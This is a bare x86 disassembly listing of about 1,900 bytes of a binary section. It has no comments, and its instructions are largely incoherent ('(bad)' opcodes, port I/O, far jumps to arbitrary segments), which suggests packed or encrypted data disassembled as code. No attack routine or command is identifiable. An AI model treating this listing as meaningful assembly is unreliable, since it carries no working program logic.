  414f91:	scas   al,BYTE PTR es:[edi]
  414f92:	mov    ebp,0xdd851141
  414f97:	cdq    
  414f98:	mov    ch,0xcb
  414f9a:	pop    ds
  414f9b:	mov    ebp,0xbaca8381
  414fa0:	popf   
  414fa1:	inc    edi
  414fa2:	sbb    BYTE PTR [esi+0x76c96594],dl
  414fa8:	xor    eax,0x5b0a8a9e
  414fad:	push   ebx
  414fae:	sti    
  414faf:	test   al,0xdc
  414fb1:	mov    cs,WORD PTR [ecx+0x28653a01]
  414fb7:	ror    DWORD PTR [esi-0x72],0x25
  414fbb:	pop    ecx
  414fbc:	shl    cl,1
  414fbe:	mov    bh,bl
  414fc0:	xchg   ebp,eax
  414fc1:	dec    eax
  414fc2:	mov    dh,0x8f
  414fc4:	jo     0x414fb8
  414fc6:	(bad)  
  414fc7:	mov    dh,0xdb
  414fc9:	and    dh,dh
  414fcb:	and    al,0xa4
  414fcd:	push   0x561f03b0
  414fd2:	sub    esp,esi
  414fd4:	inc    ecx
  414fd5:	clc    
  414fd6:	adc    BYTE PTR [ecx-0x33dbd01a],bh
  414fdc:	xor    ch,dl
  414fde:	retf   0x8da3
  414fe1:	aad    0x24
  414fe3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fe4:	inc    eax
  414fe5:	gs xchg ecx,eax
  414fe7:	fld    TBYTE PTR [ecx+0x7e7f5be]
  414fed:	dec    ecx
  414fee:	push   0xf57d538b
  414ff3:	dec    esp
  414ff4:	add    BYTE PTR [ebp-0x2606995d],bh
  414ffa:	(bad)  
  414ffb:	fadd   st(7),st
  414ffd:	nop
  414ffe:	repz push es
  415000:	mov    bl,0xbd
  415002:	xor    eax,0x6c231113
  415007:	ja     0x41501f
  415009:	in     al,0xdb
  41500b:	add    al,0xa0
  41500d:	mov    ?,WORD PTR [eax+0x5af84f90]
  415013:	xor    DWORD PTR [esi+0x6c],esp
  415016:	out    0xf0,eax
  415018:	xor    dl,BYTE PTR [ebp+0x30e83c88]
  41501e:	fbld   TBYTE PTR [ebp+0x4b]
  415021:	cmp    ecx,DWORD PTR [edx+0x24]
  415024:	pop    edx
  415025:	cmp    al,BYTE PTR [ebp-0xf540c1]
  41502b:	add    al,0xf3
  41502d:	push   ebx
  41502e:	inc    esp
  41502f:	in     eax,dx
  415030:	pop    ebp
  415031:	add    DWORD PTR [ebx-0x7f],edx
  415034:	ds popf 
  415036:	in     eax,0x83
  415038:	scas   eax,DWORD PTR es:[edi]
  415039:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41503a:	rcr    BYTE PTR [ebx-0x58],1
  41503d:	jbe    0x415014
  41503f:	cs mov esi,0x6f85fbfd
  415045:	or     DWORD PTR [ebp-0x3a],edx
  415048:	popf   
  415049:	inc    esp
  41504a:	dec    ebp
  41504b:	lahf   
  41504c:	mov    al,0x8
  41504e:	jge    0x414fd9
  415050:	push   ss
  415051:	xchg   BYTE PTR [eax-0x46e312fc],cl
  415057:	popf   
  415058:	rcl    cl,cl
  41505a:	jno    0x415067
  41505c:	xchg   BYTE PTR [ecx+0x16df41b0],al
  415062:	and    BYTE PTR [edi+0x5d],cl
  415065:	and    ecx,DWORD PTR [edx+0x6e9d4c43]
  41506b:	xor    BYTE PTR [ebx+0x4bc3c89c],ch
  415071:	icebp  
  415072:	cdq    
  415073:	into   
  415074:	mov    ebx,0x4ccfad7c
  415079:	jge    0x41502f
  41507b:	loop   0x41506d
  41507d:	mov    eax,es:0xd6f5e771
  415083:	mov    edx,DWORD PTR [esi+0x7e]
  415086:	ror    DWORD PTR [eax-0x6b],cl
  415089:	adc    ecx,DWORD PTR [ebx-0x31]
  41508c:	xchg   ebp,eax
  41508d:	div    DWORD PTR [edx+edi*8-0x8baf225]
  415094:	jne    0x415105
  415096:	dec    esp
  415097:	sub    dh,dl
  415099:	aad    0xad
  41509b:	jmp    0x2c84:0xe6271193
  4150a2:	xor    DWORD PTR [ebx+0x52],ebx
  4150a5:	(bad)  
  4150a6:	cdq    
  4150a7:	inc    edi
  4150a8:	mov    al,ds:0x41a73590
  4150ad:	dec    ecx
  4150ae:	mov    eax,ds:0x498be648
  4150b3:	ds leave 
  4150b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150b6:	cld    
  4150b7:	lods   al,BYTE PTR ds:[esi]
  4150b8:	xchg   ebp,eax
  4150b9:	push   esp
  4150ba:	pop    edi
  4150bb:	pop    esp
  4150bc:	lods   eax,DWORD PTR ds:[esi]
  4150bd:	sub    eax,0x7fcaa727
  4150c2:	xchg   esi,eax
  4150c3:	cmp    BYTE PTR [edi-0x7103b2f1],al
  4150c9:	xchg   DWORD PTR [edx-0x3895ad54],ebx
  4150cf:	or     BYTE PTR [edx+0x68465c6e],0x40
  4150d6:	push   ss
  4150d7:	fxch   st(3)
  4150d9:	and    DWORD PTR [eax],0xfffffff2
  4150dc:	je     0x4150a8
  4150de:	test   al,0xa4
  4150e0:	mov    bh,0x9a
  4150e2:	fild   QWORD PTR [edx]
  4150e4:	jg     0x4150b4
  4150e6:	scas   eax,DWORD PTR es:[edi]
  4150e7:	lods   eax,DWORD PTR ds:[esi]
  4150e8:	xchg   edi,eax
  4150e9:	repz test al,0x5b
  4150ec:	push   cs
  4150ed:	rcr    BYTE PTR [ebp+0x16],0x7e
  4150f1:	xchg   DWORD PTR [ecx+ecx*2-0x5f],edx
  4150f5:	enter  0xdf54,0x53
  4150f9:	fiadd  WORD PTR [edi]
  4150fb:	imul   DWORD PTR ds:0x57d42dcb
  415101:	dec    edx
  415102:	dec    ecx
  415103:	mov    BYTE PTR [esp+ebp*8],0x44
  415107:	sub    al,0x56
  415109:	mov    al,ds:0x1c28a702
  41510e:	xchg   ecx,eax
  41510f:	hlt    
  415110:	scas   al,BYTE PTR es:[edi]
  415111:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415112:	push   ebx
  415113:	ret    
  415114:	lds    ecx,FWORD PTR [edi-0x49]
  415117:	repnz (bad) 
  415119:	pop    ecx
  41511a:	loopne 0x41512b
  41511c:	push   esp
  41511d:	inc    esi
  41511e:	jle    0x4150d2
  415120:	mov    cl,BYTE PTR [ecx-0x2ffb8d0b]
  415126:	jmp    0x22d8:0xad9a4f80
  41512d:	pop    ss
  41512e:	jbe    0x4150f5
  415130:	jo     0x415138
  415132:	mov    BYTE PTR [edx+0x41],dl
  415135:	scas   eax,DWORD PTR es:[edi]
  415136:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415137:	test   eax,0x2acc967c
  41513c:	inc    ebx
  41513d:	dec    edx
  41513e:	adc    al,BYTE PTR [esp+esi*1-0x34861d97]
  415145:	js     0x41518c
  415147:	xor    esi,ebp
  415149:	inc    edx
  41514a:	mov    eax,ds:0xb1395563
  41514f:	std    
  415150:	aam    0xe5
  415152:	xor    eax,0x59eec1f6
  415157:	sub    al,0x56
  415159:	mov    bl,0xde
  41515b:	mov    es,WORD PTR [esi-0x96502c4]
  415161:	mov    ebx,0x7beabe6d
  415166:	shr    esi,cl
  415168:	push   eax
  415169:	push   ss
  41516a:	pop    es
  41516b:	sub    al,0x4e
  41516d:	mov    ch,bl
  41516f:	or     eax,0xcb388983
  415174:	in     eax,dx
  415175:	and    DWORD PTR [edi-0x2],eax
  415178:	sub    eax,0x78f7aa0e
  41517d:	js     0x415155
  41517f:	inc    eax
  415180:	not    ch
  415182:	aas    
  415183:	dec    eax
  415184:	push   esp
  415185:	xchg   ebx,eax
  415186:	jbe    0x415162
  415188:	ins    DWORD PTR es:[edi],dx
  415189:	push   ebp
  41518a:	jl     0x415180
  41518c:	dec    esp
  41518d:	pop    ebx
  41518e:	xlat   BYTE PTR ds:[ebx]
  41518f:	in     eax,0x89
  415191:	pop    ebp
  415192:	shr    DWORD PTR [ecx*2-0x23e1af4b],0xb9
  41519a:	pop    ss
  41519b:	inc    esp
  41519c:	rcr    DWORD PTR [ebp+edx*8+0x15a8fa1f],1
  4151a3:	popf   
  4151a4:	dec    ebp
  4151a5:	test   al,0x1a
  4151a7:	mov    edx,0xa642d344
  4151ac:	nop
  4151ad:	push   ss
  4151ae:	mov    ch,0x43
  4151b0:	jmp    0x4151c7
  4151b2:	retw   0xe3da
  4151b6:	sub    al,0x2a
  4151b8:	mov    eax,0xd4ea5802
  4151bd:	xor    cl,BYTE PTR [ebx+0x2c7d05fb]
  4151c3:	jno    0x415170
  4151c5:	cmc    
  4151c6:	mov    bl,0xd0
  4151c8:	cmp    cl,dl
  4151ca:	mov    WORD PTR [ecx-0x455c1c43],fs
  4151d0:	fs daa 
  4151d2:	mov    al,0x3b
  4151d4:	adc    DWORD PTR [edx+edx*4+0x1f],ebx
  4151d8:	cmp    ecx,DWORD PTR [edx+0x30]
  4151db:	dec    eax
  4151dc:	leave  
  4151dd:	int    0x4f
  4151df:	pop    esi
  4151e0:	not    BYTE PTR [edx-0x35c54d92]
  4151e6:	hlt    
  4151e7:	xchg   DWORD PTR [edi+eiz*8-0x3eed3078],edi
  4151ee:	add    al,0x40
  4151f0:	mov    eax,0x619d0174
  4151f5:	dec    esi
  4151f6:	pop    esi
  4151f7:	std    
  4151f8:	fld    TBYTE PTR [edi]
  4151fa:	mov    ch,0x66
  4151fc:	or     DWORD PTR [edi],edx
  4151fe:	mov    eax,ds:0x1251c6a5
  415203:	ss mov bl,0xc9
  415206:	in     al,dx
  415207:	xor    eax,eax
  415209:	xor    al,BYTE PTR [esi+0x6c]
  41520c:	pusha  
  41520d:	mov    edi,0xc592c656
  415212:	sbb    eax,edx
  415214:	push   eax
  415215:	arpl   si,dx
  415217:	clc    
  415218:	repnz mul bp
  41521c:	fcomp  DWORD PTR [ecx+0x35]
  41521f:	mov    ebx,0x32d59395
  415224:	cmp    DWORD PTR [edx],esi
  415226:	cdq    
  415227:	xchg   ecx,eax
  415228:	ds jo  0x41520b
  41522b:	dec    edx
  41522c:	push   ebx
  41522d:	dec    edi
  41522e:	dec    ecx
  41522f:	shr    BYTE PTR [ecx+0x1b],0xad
  415233:	jle    0x4151d3
  415235:	frstor [esi+0x1b4a0770]
  41523b:	scas   al,BYTE PTR es:[edi]
  41523c:	xor    al,0xc3
  41523e:	dec    ebx
  41523f:	jno    0x4152a3
  415241:	pop    ebx
  415242:	fst    DWORD PTR [esi-0x2]
  415245:	or     al,0x73
  415247:	jb     0x4152ac
  415249:	add    eax,0xc4c6f3b7
  41524e:	pop    ebx
  41524f:	mov    esi,0x50b2575
  415254:	dec    edx
  415255:	adc    DWORD PTR [edx-0x7545c00e],esp
  41525b:	mov    al,ds:0xd7f46e73
  415260:	stos   DWORD PTR es:[edi],eax
  415261:	ins    BYTE PTR es:[edi],dx
  415262:	mov    al,ah
  415264:	call   0x7f44:0x568cd35
  41526b:	ja     0x415222
  41526d:	xlat   BYTE PTR ds:[ebx]
  41526e:	test   ch,0xd2
  415271:	sub    dl,BYTE PTR [ebx+ebx*4-0x43]
  415275:	dec    edi
  415276:	dec    ebp
  415277:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415278:	outs   dx,BYTE PTR ds:[esi]
  415279:	xchg   di,ax
  41527b:	lods   al,BYTE PTR ds:[esi]
  41527c:	sahf   
  41527d:	(bad)  
  41527e:	test   al,0xae
  415280:	(bad)  
  415281:	ror    BYTE PTR [esi+eax*8+0x3c87bb7c],1
  415288:	xchg   ebx,eax
  415289:	dec    eax
  41528a:	fiadd  DWORD PTR [ecx]
  41528c:	test   DWORD PTR [ebx-0x51],0x2cfe2e8a
  415293:	xchg   BYTE PTR [edx+0x281610cc],dl
  415299:	dec    edi
  41529a:	add    BYTE PTR [edx+0x74c385d8],bl
  4152a0:	xchg   edi,eax
  4152a1:	fdivr  st,st(3)
  4152a3:	dec    edi
  4152a4:	mov    cl,BYTE PTR [ebp+0x4c9f4186]
  4152aa:	pusha  
  4152ab:	push   es
  4152ac:	add    eax,0xa9b8352d
  4152b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152b2:	inc    edx
  4152b3:	fs xor edi,0xdee41440
  4152ba:	ror    bl,0xeb
  4152bd:	daa    
  4152be:	xorps  xmm3,XMMWORD PTR [eax-0x4bbae584]
  4152c5:	shl    DWORD PTR [edx],1
  4152c7:	jg     0x4152eb
  4152c9:	push   esp
  4152ca:	adc    bl,al
  4152cc:	inc    eax
  4152cd:	fadd   QWORD PTR ss:[ecx+0x5]
  4152d1:	mov    eax,0x32fae0a8
  4152d6:	sbb    edx,DWORD PTR [ecx-0x9]
  4152d9:	lds    esi,FWORD PTR [eax-0x3dbc29bb]
  4152df:	mov    cl,0xc6
  4152e1:	loopne 0x415311
  4152e3:	xor    DWORD PTR [ecx],ebp
  4152e5:	jg     0x4152a2
  4152e7:	scas   eax,DWORD PTR es:[edi]
  4152e8:	repz jb 0x4152c2
  4152eb:	mov    ecx,0xe67725aa
  4152f0:	in     eax,0x1d
  4152f2:	jns    0x415344
  4152f4:	sub    eax,0xb4471373
  4152f9:	into   
  4152fa:	xor    edx,edx
  4152fc:	cmp    al,BYTE PTR [edx+0x7e]
  4152ff:	jns    0x415362
  415301:	push   0x2b
  415303:	mov    WORD PTR [ebx],?
  415305:	xchg   esi,eax
  415306:	sbb    eax,0xe7af2bc8
  41530b:	xor    BYTE PTR [esi],ah
  41530d:	test   BYTE PTR [ebx-0x6d],dh
  415310:	jecxz  0x415305
  415312:	add    ebx,DWORD PTR [edx]
  415314:	jl     0x4152de
  415316:	cmp    dh,BYTE PTR [ebx-0x41]
  415319:	out    0x7f,eax
  41531b:	test   eax,0x67bd369e
  415320:	xchg   edx,eax
  415321:	les    ecx,FWORD PTR [edx+0x10]
  415324:	mov    al,0xf5
  415326:	pusha  
  415327:	ds into 
  415329:	push   cs
  41532a:	mov    eax,ds:0x5fbc8b2e
  41532f:	imul   ebp,DWORD PTR [edi+0x3cc5be70],0xdab0bfa6
  415339:	xchg   DWORD PTR fs:[edi-0x4],eax
  41533d:	push   esp
  41533e:	pop    edx
  41533f:	lds    ebx,FWORD PTR [ebx+0x18057a88]
  415345:	not    esp
  415347:	jecxz  0x4152e2
  415349:	xchg   esi,eax
  41534a:	outs   dx,BYTE PTR ds:[esi]
  41534b:	loopne 0x4152f0
  41534d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41534e:	xor    al,0xad
  415350:	scas   al,BYTE PTR es:[edi]
  415351:	addr16 in al,0xfa
  415354:	outs   dx,DWORD PTR ds:[esi]
  415355:	push   0xb7577626
  41535a:	inc    esp
  41535b:	outs   dx,BYTE PTR ds:[esi]
  41535c:	mov    ebx,0xc69b2252
  415361:	push   ecx
  415362:	mov    eax,ds:0xc4f3f005
  415367:	xor    bh,BYTE PTR [edi+0x39d5e4a3]
  41536d:	and    DWORD PTR [ebp-0x1516af89],0x6e
  415374:	out    0xfe,eax
  415376:	data16 cld 
  415378:	mov    bl,0x93
  41537a:	imul   ebp,DWORD PTR [esi+0x5e937a6c],0x66834a28
  415384:	ins    DWORD PTR es:[edi],dx
  415385:	xchg   BYTE PTR [edx],al
  415387:	dec    esi
  415388:	mov    BYTE PTR [edx-0x19],dh
  41538b:	clc    
  41538c:	mov    ah,0xe8
  41538e:	pop    ebx
  41538f:	inc    edi
  415390:	inc    edi
  415391:	mov    ah,0x10
  415393:	push   es
  415394:	icebp  
  415395:	mov    DWORD PTR ds:0x1931f1e9,eax
  41539b:	shr    BYTE PTR [edx],1
  41539d:	xor    edi,edx
  41539f:	mov    dh,0x6b
  4153a1:	ja     0x415343
  4153a3:	fidiv  WORD PTR [eax-0x1d3a2a25]
  4153a9:	dec    eax
  4153aa:	sub    dl,bh
  4153ac:	pop    edx
  4153ad:	out    0xe1,al
  4153af:	(bad)  
  4153b0:	std    
  4153b1:	and    eax,0xdd531d55
  4153b6:	in     al,0xd8
  4153b8:	shl    al,cl
  4153ba:	mov    BYTE PTR [edx+0x8],dh
  4153bd:	adc    al,0x63
  4153bf:	pop    ecx
  4153c0:	jge    0x4153e9
  4153c2:	mov    al,0xcb
  4153c4:	jle    0x415404
  4153c6:	std    
  4153c7:	popf   
  4153c8:	adc    eax,edx
  4153ca:	jae    0x4153df
  4153cc:	mov    esi,0x4b425179
  4153d1:	test   al,0xeb
  4153d3:	jae    0x41537c
  4153d5:	add    eax,0x9e0e5530
  4153da:	xchg   BYTE PTR [ebp+eiz*2-0x46676748],al
  4153e1:	push   ds
  4153e2:	cmc    
  4153e3:	jmp    0x4153a9
  4153e5:	mov    edi,DWORD PTR [edi]
  4153e7:	rol    DWORD PTR [ebx+0x6e],0xf7
  4153eb:	jle    0x41545a
  4153ed:	inc    esi
  4153ee:	cli    
  4153ef:	rcr    ecx,0xbd
  4153f2:	out    0x1e,al
  4153f4:	scas   al,BYTE PTR es:[edi]
  4153f5:	cmp    BYTE PTR [ecx-0x1e],dh
  4153f8:	mov    ds:0x4f392957,al
  4153fd:	mov    ecx,0xc0bdaf47
  415402:	cmp    cl,BYTE PTR [ebx]
  415404:	pop    edi
  415405:	sbb    edx,edx
  415407:	mov    dh,0xcb
  415409:	into   
  41540a:	inc    ecx
  41540b:	shr    DWORD PTR [eax+0x1],cl
  41540e:	ret    
  41540f:	into   
  415410:	pop    eax
  415411:	dec    ebp
  415412:	dec    eax
  415413:	pusha  
  415414:	stos   DWORD PTR es:[edi],eax
  415415:	xchg   edx,eax
  415416:	enter  0x8068,0x41
  41541a:	stos   DWORD PTR es:[edi],eax
  41541b:	push   ds
  41541c:	push   ds
  41541d:	inc    edx
  41541e:	fstp   DWORD PTR [ecx+0x36]
  415421:	jb     0x4153e1
  415423:	dec    ebp
  415424:	ret    
  415425:	sbb    BYTE PTR [ecx+0xf79ed39],ah
  41542b:	sub    bl,al
  41542d:	or     eax,0x16cf7ae7
  415432:	xchg   ebp,eax
  415433:	jmp    0xe9bb:0xed3a863c
  41543a:	shr    BYTE PTR [ecx-0x630e5d94],cl
  415440:	js     0x4153f7
  415442:	mov    esp,0x64143dfc
  415447:	data16 adc al,0x12
  41544b:	mov    eax,0x42f3aee1
  415450:	mov    esi,0xf6025714
  415455:	mov    ah,0x58
  415457:	inc    BYTE PTR [ecx+0x1e840389]
  41545d:	dec    esp
  41545e:	ins    DWORD PTR es:[edi],dx
  41545f:	xchg   edx,eax
  415460:	das    
  415461:	(bad)  
  415462:	daa    
  415463:	cs adc dl,ah
  415466:	in     al,0xdd
  415468:	cmp    esp,DWORD PTR [ecx+0x4c77e1b1]
  41546e:	in     al,dx
  41546f:	js     0x4154d8
  415471:	ror    ebp,0x16
  415474:	sub    ecx,eax
  415476:	ss xor eax,0x334f1301
  41547c:	mov    ss,ebx
  41547e:	inc    edi
  41547f:	lea    ebx,[ebx]
  415481:	sar    DWORD PTR [edx],1
  415483:	add    DWORD PTR [eax],esp
  415485:	cmp    DWORD PTR [ebx-0x1f],edx
  415488:	xor    BYTE PTR [edx+0xb],0x2
  41548c:	push   es
  41548d:	jp     0x41542d
  41548f:	mov    es,ebx
  415491:	pop    ebx
  415492:	mov    BYTE PTR [edi],dh
  415494:	push   ebx
  415495:	and    ch,BYTE PTR [eax]
  415497:	add    DWORD PTR [eax-0x1e],ecx
  41549a:	gs fstp st(1)
  41549d:	popf   
  41549e:	push   0xffffffd9
  4154a0:	test   eax,0x6fe9c3b7
  4154a5:	shl    dh,1
  4154a7:	or     esp,edi
  4154a9:	xchg   ebp,eax
  4154aa:	test   BYTE PTR [ebp+0x32],0xe
  4154ae:	cli    
  4154af:	and    edi,DWORD PTR [ebx]
  4154b1:	mov    esi,0x8cd1f5a6
  4154b6:	repnz mov DWORD PTR [ebx-0x2c],ebx
  4154ba:	push   esi
  4154bb:	add    al,0x2e
  4154bd:	ins    BYTE PTR es:[edi],dx
  4154be:	aaa    
  4154bf:	xchg   ah,bl
  4154c1:	ins    DWORD PTR es:[edi],dx
  4154c2:	ins    DWORD PTR es:[edi],dx
  4154c3:	lods   al,BYTE PTR ds:[esi]
  4154c4:	nop
  4154c5:	adc    al,cl
  4154c7:	int3   
  4154c8:	iret   
  4154c9:	mov    BYTE PTR [ebp-0x626519b4],bh
  4154cf:	shr    ah,0x38
  4154d2:	stc    
  4154d3:	lock jo 0x4154dc
  4154d6:	dec    ebx
  4154d7:	sahf   
  4154d8:	push   ss
  4154d9:	pop    edx
  4154da:	cmc    
  4154db:	dec    ebp
  4154dc:	test   al,0xd6
  4154de:	and    eax,0xfa4c60ee
  4154e3:	in     al,dx
  4154e4:	ror    DWORD PTR [edx+0x3de13e1f],1
  4154ea:	sbb    al,0xf9
  4154ec:	int    0xb2
  4154ee:	mov    ds:0x9118afcb,al
  4154f3:	lock cmp eax,0xcb19fb8
  4154f9:	mov    esp,0xd0fbdbe2
  4154fe:	push   DWORD PTR [esi]
  415500:	push   es
  415501:	mov    esi,0xaeec6b01
  415506:	jo     0x41548c
  415508:	imul   ebp,DWORD PTR [ecx+ebp*8],0x4cc69af7
  41550f:	mov    eax,0xe9e1030
  415514:	repz in al,dx
  415516:	shr    ch,cl
  415518:	loopne 0x4154f5
  41551a:	inc    edi
  41551b:	xor    BYTE PTR ss:[edx-0x11],0xe7
  415520:	lds    ebp,FWORD PTR [eax-0x7ce602b8]
  415526:	sbb    al,0x80
  415528:	mov    bl,0x70
  41552a:	pop    es
  41552b:	lods   eax,DWORD PTR ds:[esi]
  41552c:	push   ds
  41552d:	stos   DWORD PTR es:[edi],eax
  41552e:	cmp    bh,ah
  415530:	dec    edi
  415531:	mov    dh,0xfe
  415533:	fst    st(3)
  415535:	push   cs
  415536:	sbb    ah,BYTE PTR [ecx]
  415538:	pop    ebx
  415539:	in     eax,0x7a
  41553b:	rcl    bh,cl
  41553d:	test   esi,eax
  41553f:	pop    esp
  415540:	sub    al,0x75
  415542:	sbb    eax,0x49d0adac
  415547:	inc    ebx
  415548:	jns    0x4154e0
  41554a:	xchg   esp,eax
  41554b:	test   BYTE PTR [ecx+0x621454dd],cl
  415551:	push   ds
  415552:	jmp    0x415527
  415554:	aam    0x7b
  415556:	lods   al,BYTE PTR ds:[esi]
  415557:	loope  0x415519
  415559:	or     edi,DWORD PTR [edi-0x68c0f122]
  41555f:	pop    ss
  415560:	pop    ebp
  415561:	push   edi
  415562:	lods   al,BYTE PTR ds:[esi]
  415563:	mov    edx,0x49d24157
  415568:	add    DWORD PTR [ecx+0x74],0xffffff9b
  41556c:	xchg   ebx,eax
  41556d:	retf   
  41556e:	sbb    al,0x54
  415570:	or     al,0x18
  415572:	jle    0x415544
  415574:	inc    ebx
  415575:	shl    cl,1
  415577:	add    dl,dh
  415579:	jns    0x2e411723
  41557f:	(bad)  
  415580:	sub    al,0x2b
  415582:	fisub  DWORD PTR [edi-0x1b978175]
  415588:	and    al,0xad
  41558a:	popa   
  41558b:	cmp    al,BYTE PTR [esi+eiz*2]
  41558e:	xor    edi,ecx
  415590:	sbb    eax,0xc731bdd5
  415595:	dec    edi
  415596:	(bad)  
  415597:	iret   
  415598:	inc    esi
  415599:	loope  0x415555
  41559b:	xor    BYTE PTR [eax],ch
  41559d:	div    DWORD PTR [ebx-0x6a]
  4155a0:	or     bh,BYTE PTR [eax-0x33]
  4155a3:	mov    ch,0x50
  4155a5:	cmp    eax,0x37412b3d
  4155aa:	adc    al,BYTE PTR [eax+0x1d]
  4155ad:	ret    0x421
  4155b0:	adc    DWORD PTR [esi+0x41],edi
  4155b3:	xlat   BYTE PTR ds:[ebx]
  4155b4:	xchg   edx,eax
  4155b5:	test   BYTE PTR [ecx],ah
  4155b7:	jmp    0x6eee:0x6c7e69ba
  4155be:	(bad)  
  4155c0:	cs pop eax
  4155c2:	sbb    DWORD PTR [eax+0x726204cd],eax
  4155c8:	jne    0x41555d
  4155ca:	mov    dh,0x90
  4155cc:	xor    al,0x68
  4155ce:	pop    ecx
  4155cf:	lahf   
  4155d0:	in     al,dx
  4155d1:	(bad)  
  4155d2:	iret   
  4155d3:	jns    0x4155fd
  4155d5:	loope  0x4155c9
  4155d7:	jo     0x415572
  4155d9:	sbb    ch,dh
  4155db:	(bad)  
  4155dd:	sub    eax,0x2a8cb990
  4155e3:	das    
  4155e4:	fadd   DWORD PTR [edx+0x39]
  4155e7:	gs iret 
  4155e9:	inc    ecx
  4155ea:	hlt    
  4155eb:	sbb    ebp,DWORD PTR [ecx]
  4155ed:	sbb    bh,bl
  4155ef:	xchg   edx,eax
  4155f0:	xor    eax,0x7d053609
  4155f5:	sbb    dh,ah
  4155f7:	dec    eax
  4155f8:	dec    eax
  4155f9:	(bad)  
  4155fa:	push   0xffffff92
  4155fc:	xor    edi,DWORD PTR [eax+0x755f76b6]
  415602:	sahf   
  415603:	mov    edx,0x3598f7f5
  415608:	xchg   DWORD PTR [edx],edx
  41560a:	test   al,0xfd
  41560c:	pop    ebp
  41560d:	in     eax,dx
  41560e:	mov    cl,0x7
  415610:	fs jle 0x415683
  415613:	(bad)  
  415614:	xlat   BYTE PTR ds:[ebx]
  415615:	ficom  WORD PTR [eax+0x24]
  415618:	leave  
  415619:	mov    ecx,0x600124f
  41561e:	iret   
  41561f:	fsubr  QWORD PTR [ebp-0x53b490f4]
  415625:	xchg   ebp,eax
  415626:	imul   ecx,DWORD PTR [edx],0xffffffe1
  415629:	outs   dx,DWORD PTR ds:[esi]
  41562a:	jmp    0x4012:0x1f98268e
  415631:	add    eax,0x443d6bbb
  415636:	std    
  415637:	cmp    al,0xcd
  415639:	out    0x7c,al
  41563b:	xor    eax,0xcfb6d0f
  415640:	cld    
  415641:	jns    0x4155e7
  415643:	(bad)  
  415644:	out    dx,eax
  415645:	cmc    
  415646:	(bad)  
  415647:	cmp    eax,0x1561111
  41564c:	xchg   edx,eax
  41564d:	mov    dh,0xae
  41564f:	jge    0x415628
  415651:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415652:	and    eax,0xe5aeb706
  415657:	jmp    0x2ab6d660
  41565c:	cwde   
  41565d:	jmp    0x7456:0x56a4331e
  415664:	ficomp DWORD PTR [edx]
  415666:	out    dx,al
  415667:	push   edi
  415668:	(bad)  
  415669:	cli    
  41566a:	sahf   
  41566b:	add    eax,edx
  41566d:	ss inc ecx
  41566f:	xchg   edx,eax
  415670:	cmovo  esp,ebx
  415673:	ror    BYTE PTR [edx],cl
  415675:	in     eax,dx
  415676:	outs   dx,DWORD PTR ds:[esi]
  415677:	jl     0x4156b8
  415679:	add    BYTE PTR [ecx-0x6a14d206],cl
  41567f:	inc    esp
  415680:	sahf   
  415681:	pop    eax
  415682:	sub    al,0x2d
  415684:	call   0xc6d5:0x33160cb4
  41568b:	mov    eax,0x1a5257a3
  415690:	int    0x6
  415692:	lods   eax,DWORD PTR ds:[esi]
  415693:	add    BYTE PTR [edx+0x2179ff45],ch
  415699:	mov    ah,0xfc
  41569b:	mov    ch,0x1d
  41569d:	xchg   esp,eax
  41569e:	add    dh,BYTE PTR [ecx]
  4156a0:	adc    ch,cl
  4156a2:	mov    esp,0xfbe487d4
  4156a7:	push   edx
  4156a8:	pushf  
  4156a9:	sbb    ebp,esp
  4156ab:	imul   eax,esp,0x5e
  4156ae:	(bad)  
  4156b0:	cli    
  4156b1:	mov    al,ds:0xd3a85299
  4156b6:	ret    
  4156b7:	xchg   edi,eax
  4156b8:	sar    bh,1
  4156ba:	push   ss
  4156bb:	test   DWORD PTR [ebx-0x6fcd81d6],0xfacda248
  4156c5:	outs   dx,DWORD PTR ds:[esi]
  4156c6:	stos   DWORD PTR es:[edi],eax
  4156c7:	or     ch,BYTE PTR [edx+0x28f16eb6]
  4156cd:	pop    bx
  4156cf:	and    DWORD PTR [eax-0x746bb848],0x76
  4156d6:	pusha  
  4156d7:	and    BYTE PTR [esi+0x3d],dh
  4156da:	int    0x94
  4156dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156dd:	jp     0x415715
  4156df:	mov    cl,0xf
  4156e1:	retf   0x8dd7
  4156e4:	jmp    0x415740
  4156e6:	and    DWORD PTR [edx-0x58cb1b7c],0xd89bd03f
  4156f0:	push   es
  4156f1:	sbb    edi,ebx
  4156f3:	cmp    edx,DWORD PTR [ebx-0x67]
  4156f6:	add    al,0xc9
  4156f8:	sub    al,0x1d
  4156fa:	fs pop esi
  4156fc:	enter  0x6802,0xfa
  415700:	mov    ch,0x7
  415702:	in     al,0x7e
  415704:	push   cs
  415705:	inc    edi
  415706:	jnp    0x415716
  415708:	test   DWORD PTR [ebx],edi
  41570a:	clc    
  41570b:	fld    QWORD PTR [ebx]
  41570d:	fld    DWORD PTR [eax]
  41570f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415710:	xor    al,0x7a
  415712:	je     0x4156f9
  415714:	push   esp
  415715:	div    DWORD PTR [edx+0x7c605a42]
  41571b:	jmp    0x41e6:0x18936192
  415722:	xor    al,0xee
  415724:	mov    ecx,0xbd50799
  415729:	daa    
  41572a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41572b:	or     al,0x6e
  41572d:	jp     0x415761
  41572f:	push   eax
  415730:	retf   
  415731:	std    
  415732:	dec    eax
  415733:	sti    
  415734:	sti    
  415735:	push   ss
  415736:	jmp    0x415796
  415738:	jnp    0x415702
  41573a:	pop    eax
  41573b:	mov    bl,0xaa
  41573d:	dec    ebp
  41573e:	out    dx,al
  41573f:	jns    0x415769
  415741:	dec    esi
  415742:	push   eax
  415743:	imul   edi,DWORD PTR [edx],0x75
  415746:	mov    gs,WORD PTR [ecx+ecx*4]
  415749:	test   al,0xdb
  41574b:	fstp   st(0)
  41574d:	pop    edx
  41574e:	add    bh,dl
  415750:	enter  0xa934,0xf5
  415754:	xor    DWORD PTR [ebp-0x1586d64],esp
  41575a:	addr16 add eax,0xb8e41226
  415760:	das    
